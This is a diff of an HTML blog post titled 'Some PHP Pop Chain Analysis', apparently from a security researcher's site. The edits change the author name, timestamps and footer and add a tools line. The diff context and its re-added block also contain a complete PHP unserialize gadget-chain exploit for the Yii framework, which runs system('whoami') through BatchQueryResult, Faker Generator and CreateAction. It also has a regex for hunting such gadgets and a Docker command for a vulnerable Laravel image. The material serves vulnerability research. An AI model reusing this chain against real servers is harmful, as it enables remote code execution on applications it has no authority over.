@@ -2,7 +2,7 @@
 <html class="has-navbar-fixed-top">
 <head>
     <meta charset="utf-8">
-<title>Some PHP Pop Chain Analysis - ShuYu</title>
+<title>Some PHP Pop Chain Analysis - 书鱼</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
 <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.css">
@@ -20,7 +20,7 @@
 <meta property="og:type" content="article">
 <meta property="og:title" content="Some PHP Pop Chain Analysis">
 <meta property="og:url" content="http://example.com/2020/12/01/Some-Php-Pop-Chain-Analysis/index.html">
-<meta property="og:site_name" content="ShuYu">
+<meta property="og:site_name" content="书鱼">
 <meta property="og:description" content="There are some interesting php pop chain I really enjoy it.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/2020/12/01/Some-Php-Pop-Chain-Analysis/1.png">
@@ -42,8 +42,8 @@
 <meta property="og:image" content="http://example.com/2020/12/01/Some-Php-Pop-Chain-Analysis/17.png">
 <meta property="og:image" content="http://example.com/2020/12/01/Some-Php-Pop-Chain-Analysis/18.png">
 <meta property="article:published_time" content="2020-12-01T06:47:13.000Z">
-<meta property="article:modified_time" content="2020-12-14T08:03:52.252Z">
-<meta property="article:author" content="ShuYu">
+<meta property="article:modified_time" content="2020-12-14T08:27:36.197Z">
+<meta property="article:author" content="Bkfish">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/2020/12/01/Some-Php-Pop-Chain-Analysis/1.png">
@@ -158,7 +158,7 @@
         <span class="column is-narrow">
             
             
-            12 minutes read (About 1773 words)
+            12 minutes read (About 1777 words)
         </span>
         
     </div>
@@ -195,6 +195,7 @@
 </ul>
 <!-- tocstop -->
 
+<p>Tools:<br>vscode,PHP IntelliSense</p>
 <h2><span id="1-laravel-unserialize-pop-chain">1. Laravel Unserialize Pop Chain</span></h2><p>Laravel is a php framework for web artisans,website <a target="_blank" rel="noopener" href="https://laravel.com/">https://laravel.com/</a>. build this laravel i think is diffcute so i use docker to build them.in <code>vendor/laravel/framework/src/Illuminate/Foundation/Application.php</code> Line 32 you can see which version you build<br><img src="1.png"></p>
 <h3><span id="11-laravel-58x">1.1. Laravel 5.8.X</span></h3><p>Run by docker<code>docker run -d -p 8000:8000 --name laravel oubingbing/laravel5.8:v1</code>.<br>vim /routes/web.php </p>
 <figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php">Route::get(<span class="hljs-string">&quot;/demo&quot;</span>,<span class="hljs-string">&quot;\App\Http\Controllers\DemoController@demo&quot;</span>);<br></code></pre></td></tr></tbody></table></figure>
@@ -263,7 +264,7 @@
 <p><img src="18.png"><br>so we need search other dangerous function which param can be array();<br>in vscode we can search by regular expression <code>call_user_func\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code>or <code>call_user_func_array\(\$this-&gt;([a-zA-Z0-9]+), \$this-&gt;([a-zA-Z0-9]+)</code><br>in <code>namespace yii\rest;</code>,<code>class IndexAction </code> </p>
 <figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>{<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checkAccess) {<br>        call_user_func(<span class="hljs-keyword">$this</span>-&gt;checkAccess, <span class="hljs-keyword">$this</span>-&gt;id);<br>    }<br>    .....<br>}<br></code></pre></td></tr></tbody></table></figure>
 <p>or <code>namespace yii\rest; class IndexAction</code><br>so we need set <code>$this-&gt;checkAccess</code> as system.<code>$this-&gt;id</code> as whoami<br>then set <code>$this-&gt;formatters[&apos;close&apos;]</code> as <code>[new CreateAction, &apos;run&apos;]</code><br>so final exp</p>
-<figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>{<br>    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>{<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&apos;system&apos;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&apos;whoami&apos;</span>;<br>        }<br>    }<br>}<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>{<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>{<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&apos;close&apos;</span>] = [<span class="hljs-keyword">new</span> CreateAction, <span class="hljs-string">&apos;run&apos;</span>];<br>        }<br>    }<br>}<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>{<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>{<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>        }<br>    }<br>}<br><span class="hljs-keyword">namespace</span>{<br>    <span class="hljs-title">echo</span> <span class="hljs-title">urlencode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>));<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure></body></html>
+<figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>{<br>    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span>{<br>        <span class="hljs-title">public</span> $<span class="hljs-title">checkAccess</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$id</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">$this</span>-&gt;checkAccess = <span class="hljs-string">&apos;system&apos;</span>;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&apos;whoami&apos;</span>;<br>        }<br>    }<br>}<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>{<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>{<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$formatters</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&apos;close&apos;</span>] = [<span class="hljs-keyword">new</span> CreateAction, <span class="hljs-string">&apos;run&apos;</span>];<br>        }<br>    }<br>}<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>{<br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span>{<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$_dataReader</span>;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>;<br>        }<br>    }<br>}<br><span class="hljs-keyword">namespace</span>{<br>    <span class="hljs-title">echo</span> <span class="hljs-title">urlencode</span>(<span class="hljs-title">serialize</span>(<span class="hljs-title">new</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>));<br>}<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure></body></html>
     
     </div>
     
@@ -298,7 +299,7 @@
     <div class="container">
         <div class="columns content">
             <div class="column is-narrow has-text-centered">
-                &copy; 2020 ShuYu&nbsp;
+                &copy; 2021 Bkfish&nbsp;
                 Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
                         target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
